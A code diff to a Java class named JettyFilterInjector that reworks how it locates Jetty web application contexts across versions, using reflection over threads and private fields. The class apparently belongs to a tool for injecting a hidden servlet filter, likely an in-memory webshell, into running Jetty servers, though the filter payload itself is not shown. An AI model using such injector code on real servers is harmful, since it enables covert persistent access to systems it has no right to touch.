@@ -106,29 +106,26 @@ public class JettyFilterInjector {
         }
     }
 
-    private List<Object> getContext() {
+    private List<Object> getContext() throws Exception {
         List<Object> contexts = new ArrayList<Object>();
-        Thread[] threads = Thread.getAllStackTraces().keySet().toArray(new Thread[0]);
+        Thread[] threads = (Thread[]) invokeMethod(Thread.class, "getThreads", new Class[0], new Object[0]);
         for (Thread thread : threads) {
             try {
+                // jetty 6
                 Object contextClassLoader = invokeMethod(thread, "getContextClassLoader");
                 if (contextClassLoader.getClass().getName().contains("WebAppClassLoader")) {
-                    Object context = getFieldValue(contextClassLoader, "_context");
-                    Object handler = getFieldValue(context, "_servletHandler");
-                    contexts.add(getFieldValue(handler, "_contextHandler"));
+                    contexts.add(getFieldValue(contextClassLoader, "_context"));
                 } else {
-                    Object threadLocals = getFieldValue(thread, "threadLocals");
-                    Object table = getFieldValue(threadLocals, "table");
-                    for (int i = 0; i < Array.getLength(table); ++i) {
+                    // jetty 7+
+                    Object table = getFieldValue(getFieldValue(thread, "threadLocals"), "table");
+                    for (int i = 0; i < Array.getLength(table); i++) {
                         Object entry = Array.get(table, i);
                         if (entry != null) {
-                            Object httpConnection = getFieldValue(entry, "value");
-                            if (httpConnection != null && httpConnection.getClass().getName().contains("HttpConnection")) {
-                                Object httpChannel = invokeMethod(httpConnection, "getHttpChannel");
-                                Object request = invokeMethod(httpChannel, "getRequest");
-                                Object session = invokeMethod(request, "getSession");
-                                Object servletContext = invokeMethod(session, "getServletContext");
-                                contexts.add(getFieldValue(servletContext, "this$0"));
+                            Object threadLocalValue = getFieldValue(entry, "value");
+                            if (threadLocalValue != null) {
+                                if (threadLocalValue.getClass().getName().contains("WebAppContext")) {
+                                    contexts.add(getFieldValue(threadLocalValue, "this$0"));
+                                }
                             }
                         }
                     }
